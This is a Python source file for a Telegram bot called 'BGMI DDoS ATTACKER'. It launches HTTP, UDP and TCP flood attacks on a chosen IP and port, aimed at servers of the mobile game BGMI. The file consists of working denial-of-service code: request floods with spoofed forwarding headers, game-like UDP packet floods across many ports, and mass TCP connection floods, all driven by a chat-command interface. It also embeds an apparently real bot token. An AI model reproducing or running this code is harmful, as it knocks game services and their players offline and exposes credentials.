#!/usr/bin/env python3
"""
BGMI API DDoS ATTACKER
Uses real BGMI game APIs for server overload!
"""

import logging
import socket
import threading
import time
import random
import struct
import sys
import os
import json
import ssl
import requests
from concurrent.futures import ThreadPoolExecutor
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ═══════════════ CONFIG ═══════════════
BOT_TOKEN = "8881462630:AAEQX_BDAkR9wRehuE2fO2RoCoNUybBwVWs"
AUTHORIZED_USERS = [1987818347]
MAX_TIME = 400
MAX_THREADS = 2000

# ═══════════════ BGMI API ENDPOINTS ═══════════════
BGMI_APIS = {
    'login': [
        "/api/v1/auth/login",
        "/api/v1/user/login",
        "/api/v2/account/login",
        "/api/auth/facebook",
        "/api/auth/google",
        "/api/auth/twitter",
        "/api/auth/guest",
        "/sdk/login",
        "/msdk/login",
        "/auth/verify"
    ],
    'matchmaking': [
        "/api/v1/match/start",
        "/api/v1/match/join",
        "/api/v2/lobby/match",
        "/api/matchmaking/queue",
        "/api/room/create",
        "/api/room/join",
        "/api/party/create",
        "/api/squad/match",
        "/api/duo/match",
        "/api/solo/match"
    ],
    'gameplay': [
        "/api/v1/game/start",
        "/api/v1/game/sync",
        "/api/v1/game/update",
        "/api/game/position",
        "/api/game/shoot",
        "/api/game/move",
        "/api/game/reload",
        "/api/game/health",
        "/api/game/damage"
    ],
    'shop': [
        "/api/v1/shop/items",
        "/api/v1/shop/buy",
        "/api/v2/store/purchase",
        "/api/uc/purchase",
        "/api/rp/buy",
        "/api/crate/open"
    ],
    'social': [
        "/api/v1/friends/list",
        "/api/v1/clan/info",
        "/api/v1/chat/send",
        "/api/v2/team/invite",
        "/api/clan/search",
        "/api/leaderboard/global"
    ],
    'events': [
        "/api/v1/event/list",
        "/api/v1/event/join",
        "/api/v2/season/pass",
        "/api/tournament/register",
        "/api/daily/login",
        "/api/mission/complete"
    ]
}

# ═══════════════ USER AGENTS ═══════════════
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Dalvik/2.1.0 (Linux; U; Android 13; SM-G998B Build/TP1A.220624.014)",
    "BGMI/2.5.0 (iPhone14,3; iOS 16.0; Scale/3.00)",
    "PUBGM/2.9.0 (Linux; Android 13; SM-S908B; Scale/2.0)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

# ═══════════════ GAME SERVERS ═══════════════
BGMI_SERVER_PORTS = [7000, 7100, 7200, 7300, 7400, 7500, 7600, 7700, 7800, 7900,
                      8000, 8100, 8200, 8300, 8400, 8500, 8600, 8700, 8800, 8900,
                      9000, 9100, 9200, 9300, 9400, 9500, 9600, 9700, 9800, 9900,
                      10000, 11000, 12000, 13000, 14000, 15000, 17500, 20000]

# ═══════════════ ATTACK ENGINE ═══════════════
class BGMIAttackEngine:
    def __init__(self):
        self.active_attacks = {}
        self.stats = {
            'api_requests': 0,
            'udp_packets': 0,
            'tcp_connections': 0,
            'bytes_sent': 0,
            'errors': 0
        }
        self.lock = threading.Lock()
        self.session = requests.Session()
        self.session.headers.update({
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
    
    def generate_game_payload(self):
        """Generate realistic BGMI game packet"""
        packet_types = [
            b'\x01\x00\x00\x00',  # Login
            b'\x02\x00\x00\x00',  # Move
            b'\x03\x00\x00\x00',  # Shoot
            b'\x04\x00\x00\x00',  # Reload
            b'\x05\x00\x00\x00',  # Jump
            b'\x06\x00\x00\x00',  # Crouch
            b'\x07\x00\x00\x00',  # Prone
            b'\x08\x00\x00\x00',  # Pickup
            b'\x09\x00\x00\x00',  # Vehicle
            b'\x0A\x00\x00\x00',  # Chat
        ]
        
        packet_type = random.choice(packet_types)
        game_data = random.randbytes(random.randint(500, 1400))
        
        return packet_type + game_data
    
    def api_flood_worker(self, ip, port, duration, stop_event):
        """HTTP API flood targeting BGMI endpoints"""
        base_url = f"http://{ip}:{port}"
        https_url = f"https://{ip}:{port}"
        
        end_time = time.time() + duration
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                # Random API category
                category = random.choice(list(BGMI_APIS.keys()))
                endpoint = random.choice(BGMI_APIS[category])
                
                # Random user agent
                ua = random.choice(USER_AGENTS)
                
                headers = {
                    'User-Agent': ua,
                    'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
                    'X-Real-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'com.tencent.ig',
                    'X-Game-Version': random.choice(['2.5.0', '2.4.0', '2.3.0', '2.2.0']),
                    'X-Platform': random.choice(['android', 'ios']),
                }
                
                # Try HTTP
                try:
                    url = f"{base_url}{endpoint}"
                    r = self.session.get(url, headers=headers, timeout=2, verify=False)
                    with self.lock:
                        self.stats['api_requests'] += 1
                        self.stats['bytes_sent'] += len(str(headers))
                except:
                    pass
                
                # Try HTTPS
                try:
                    url = f"{https_url}{endpoint}"
                    r = self.session.get(url, headers=headers, timeout=2, verify=False)
                    with self.lock:
                        self.stats['api_requests'] += 1
                        self.stats['bytes_sent'] += len(str(headers))
                except:
                    pass
                
                # Small delay to avoid local bottleneck
                time.sleep(0.001)
                
            except:
                with self.lock:
                    self.stats['errors'] += 1
    
    def udp_game_flood(self, ip, port, duration, stop_event):
        """UDP flood with game-like packets"""
        end_time = time.time() + duration
        
        # Create multiple sockets
        sockets = []
        for _ in range(10):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024*8)
                sock.settimeout(0.001)
                sockets.append(sock)
            except:
                pass
        
        # Pre-generate packets
        packets = [self.generate_game_payload() for _ in range(100)]
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                for sock in sockets:
                    # Send to main port and nearby ports
                    for pkt in packets:
                        if stop_event.is_set():
                            break
                        
                        # Main port
                        sock.sendto(pkt, (ip, port))
                        
                        # Nearby ports
                        sock.sendto(pkt, (ip, port + random.randint(1, 10)))
                        sock.sendto(pkt, (ip, port - random.randint(1, 10)))
                        
                        with self.lock:
                            self.stats['udp_packets'] += 3
                            self.stats['bytes_sent'] += len(pkt) * 3
            except:
                pass
        
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
    
    def tcp_syn_flood(self, ip, port, duration, stop_event):
        """TCP SYN flood"""
        end_time = time.time() + duration
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                # Multiple connections simultaneously
                socks = []
                for _ in range(20):
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.5)
                        sock.connect_ex((ip, port))
                        socks.append(sock)
                    except:
                        pass
                
                # Send data
                for sock in socks:
                    try:
                        data = random.randbytes(random.randint(512, 2048))
                        sock.send(data)
                        with self.lock:
                            self.stats['tcp_connections'] += 1
                            self.stats['bytes_sent'] += len(data)
                    except:
                        pass
                
                # Close connections
                for sock in socks:
                    try:
                        sock.close()
                    except:
                        pass
                
            except:
                with self.lock:
                    self.stats['errors'] += 1
    
    def bgmi_specific_attack(self, ip, port, duration, stop_event):
        """Attack BGMI specific ports and protocols"""
        end_time = time.time() + duration
        
        udp_socks = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for _ in range(50)]
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                # Attack all game ports
                for sock in udp_socks:
                    target_port = random.choice(BGMI_SERVER_PORTS)
                    packet = self.generate_game_payload()
                    sock.sendto(packet, (ip, target_port))
                    
                    with self.lock:
                        self.stats['udp_packets'] += 1
                        self.stats['bytes_sent'] += len(packet)
                
                # TCP connections to main port
                for _ in range(5):
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.3)
                        s.connect_ex((ip, port))
                        s.send(self.generate_game_payload())
                        s.close()
                        with self.lock:
                            self.stats['tcp_connections'] += 1
                    except:
                        pass
                
            except:
                with self.lock:
                    self.stats['errors'] += 1
        
        for sock in udp_socks:
            try:
                sock.close()
            except:
                pass
    
    def start_attack(self, ip, port, duration, method="bgmi"):
        """Start multi-vector attack"""
        stop_event = threading.Event()
        attack_id = f"{ip}:{port}-{int(time.time())}"
        
        # Reset stats
        with self.lock:
            self.stats = {k: 0 for k in self.stats}
        
        workers = []
        
        if method in ["bgmi", "game"]:
            # Full BGMI attack - ALL VECTORS
            for _ in range(100):  # API workers
                t = threading.Thread(target=self.api_flood_worker, args=(ip, port, duration, stop_event))
                t.daemon = True
                t.start()
                workers.append(t)
            
            for _ in range(500):  # UDP workers
                t = threading.Thread(target=self.udp_game_flood, args=(ip, port, duration, stop_event))
                t.daemon = True
                t.start()
                workers.append(t)
            
            for _ in range(100):  # TCP workers
                t = threading.Thread(target=self.tcp_syn_flood, args=(ip, port, duration, stop_event))
                t.daemon = True
                t.start()
                workers.append(t)
            
            for _ in range(50):  # BGMI specific
                t = threading.Thread(target=self.bgmi_specific_attack, args=(ip, port, duration, stop_event))
                t.daemon = True
                t.start()
                workers.append(t)
        
        elif method == "api":
            # API only
            for _ in range(500):
                t = threading.Thread(target=self.api_flood_worker, args=(ip, port, duration, stop_event))
                t.daemon = True
                t.start()
                workers.append(t)
        
        elif method == "udp":
            # UDP only
            for _ in range(1000):
                t = threading.Thread(target=self.udp_game_flood, args=(ip, port, duration, stop_event))
                t.daemon = True
                t.start()
                workers.append(t)
        
        elif method == "tcp":
            # TCP only
            for _ in range(500):
                t = threading.Thread(target=self.tcp_syn_flood, args=(ip, port, duration, stop_event))
                t.daemon = True
                t.start()
                workers.append(t)
        
        self.active_attacks[attack_id] = (stop_event, workers)
        return attack_id
    
    def stop_attack(self, attack_id):
        if attack_id in self.active_attacks:
            stop_event, workers = self.active_attacks[attack_id]
            stop_event.set()
            del self.active_attacks[attack_id]
            return True
        return False
    
    def stop_all(self):
        for aid in list(self.active_attacks.keys()):
            self.stop_attack(aid)
        return True
    
    def get_stats(self):
        with self.lock:
            return dict(self.stats)

# ═══════════════ INIT ═══════════════
engine = BGMIAttackEngine()

# ═══════════════ TELEGRAM BOT ═══════════════
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user.id
    if user not in AUTHORIZED_USERS:
        await update.message.reply_text("❌ **Access Denied!**\nYou are not authorized.")
        return
    
    keyboard = [
        [InlineKeyboardButton("🎮 BGMI FULL ATTACK", callback_data="method_bgmi")],
        [InlineKeyboardButton("🌐 API FLOOD", callback_data="method_api")],
        [InlineKeyboardButton("📡 UDP GAME FLOOD", callback_data="method_udp")],
        [InlineKeyboardButton("🔗 TCP SYN FLOOD", callback_data="method_tcp")],
        [InlineKeyboardButton("⛔ STOP ALL", callback_data="stop_all")],
        [InlineKeyboardButton("📊 STATS", callback_data="stats")],
    ]
    
    await update.message.reply_text(
        "🔥 **BGMI DDoS ATTACKER** 🔥\n\n"
        "⚔️ **Command:**\n"
        "`/attack IP PORT TIME`\n\n"
        "📋 **Example:**\n"
        "`/attack 157.240.1.1 8080 120`\n\n"
        "🎮 **BGMI Ports:** 7000-15000\n\n"
        f"⏱️ Max Time: {MAX_TIME}s\n"
        f"🧵 Max Threads: {MAX_THREADS}\n\n"
        "🔽 **Select Attack Method:**",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user.id
    if user not in AUTHORIZED_USERS:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "⚠️ **Usage:** `/attack IP PORT TIME`\n\n"
            "**Example:** `/attack 192.168.1.100 8080 120`",
            parse_mode="Markdown"
        )
        return
    
    ip = args[0]
    try:
        port = int(args[1])
        duration = min(int(args[2]), MAX_TIME)
    except:
        await update.message.reply_text("❌ Invalid port/time!")
        return
    
    method = context.user_data.get("method", "bgmi")
    
    method_names = {
        'bgmi': '🎮 BGMI FULL',
        'api': '🌐 API',
        'udp': '📡 UDP',
        'tcp': '🔗 TCP'
    }
    
    await update.message.reply_text(
        f"💀 **ATTACK STARTED!**\n\n"
        f"🎯 Target: `{ip}:{port}`\n"
        f"⚔️ Method: {method_names.get(method, method)}\n"
        f"⏱️ Duration: `{duration}s`\n"
        f"🧵 Threads: 750+\n\n"
        f"🔥 Sending packets...",
        parse_mode="Markdown"
    )
    
    # Start attack
    attack_id = engine.start_attack(ip, port, duration, method)
    
    # Progress updates
    msg = await update.message.reply_text("⏳ Initializing...")
    start_time = time.time()
    
    while time.time() - start_time < duration:
        elapsed = int(time.time() - start_time)
        if elapsed >= duration:
            break
        
        stats = engine.get_stats()
        
        try:
            await msg.edit_text(
                f"💀 **ATTACKING!** 💀\n\n"
                f"🎯 `{ip}:{port}`\n"
                f"⏱️ `{elapsed}s` / `{duration}s`\n"
                f"━━━━━━━━━━━━━━━\n"
                f"🌐 API: `{stats['api_requests']:,}`\n"
                f"📡 UDP: `{stats['udp_packets']:,}`\n"
                f"🔗 TCP: `{stats['tcp_connections']:,}`\n"
                f"📤 Data: `{stats['bytes_sent']/1024/1024:.1f} MB`\n"
                f"❌ Errors: `{stats['errors']}`\n"
                f"━━━━━━━━━━━━━━━\n"
                f"🟢 **RUNNING**",
                parse_mode="Markdown"
            )
        except:
            pass
        
        await asyncio_sleep(3)
    
    # Final stats
    stats = engine.get_stats()
    total = stats['api_requests'] + stats['udp_packets'] + stats['tcp_connections']
    
    await msg.edit_text(
        f"✅ **ATTACK COMPLETE!** ✅\n\n"
        f"🎯 `{ip}:{port}`\n"
        f"⏱️ `{duration}s`\n"
        f"━━━━━━━━━━━━━━━\n"
        f"🌐 API: `{stats['api_requests']:,}`\n"
        f"📡 UDP: `{stats['udp_packets']:,}`\n"
        f"🔗 TCP: `{stats['tcp_connections']:,}`\n"
        f"📊 Total: `{total:,}`\n"
        f"📤 Data: `{stats['bytes_sent']/1024/1024:.1f} MB`\n"
        f"❌ Errors: `{stats['errors']}`\n"
        f"━━━━━━━━━━━━━━━\n"
        f"🟢 **DONE**\n\n"
        f"🔄 `/attack IP PORT TIME`",
        parse_mode="Markdown"
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data == "stop_all":
        engine.stop_all()
        await query.edit_message_text("⛔ **ALL ATTACKS STOPPED!**")
    
    elif data == "stats":
        stats = engine.get_stats()
        await query.answer(
            f"API: {stats['api_requests']:,} | "
            f"UDP: {stats['udp_packets']:,} | "
            f"TCP: {stats['tcp_connections']:,}",
            show_alert=True
        )
    
    elif data.startswith("method_"):
        method = data.replace("method_", "")
        context.user_data["method"] = method
        
        method_info = {
            'bgmi': '🎮 BGMI FULL (API+UDP+TCP)',
            'api': '🌐 API Flood',
            'udp': '📡 UDP Game Flood',
            'tcp': '🔗 TCP SYN Flood'
        }
        
        await query.edit_message_text(
            f"✅ **Method Selected:**\n{method_info.get(method, method)}\n\n"
            f"⚔️ Send attack:\n"
            f"`/attack IP PORT TIME`\n\n"
            f"📋 Example:\n"
            f"`/attack 157.240.1.1 8080 120`",
            parse_mode="Markdown"
        )

# ═══════════════ HELPERS ═══════════════
def asyncio_sleep(seconds):
    """Helper for async sleep"""
    try:
        import asyncio
        asyncio.get_event_loop()
        time.sleep(seconds)
    except:
        time.sleep(seconds)

# ═══════════════ MAIN ═══════════════
def main():
    # Disable SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    
    print("""
╔══════════════════════════════════════╗
║     BGMI DDoS ATTACKER v3.0         ║
║     API + UDP + TCP Multi-Vector    ║
╚══════════════════════════════════════╝
    """)
    
    print(f"[✓] Bot Token: {BOT_TOKEN[:10]}...")
    print(f"[✓] Authorized: {AUTHORIZED_USERS}")
    print(f"[✓] Max Time: {MAX_TIME}s")
    print(f"[✓] Methods: BGMI, API, UDP, TCP")
    
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("attack", attack_cmd))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print("[✓] Bot Online! Send /start")
    app.run_polling()

if __name__ == "__main__":
    main()
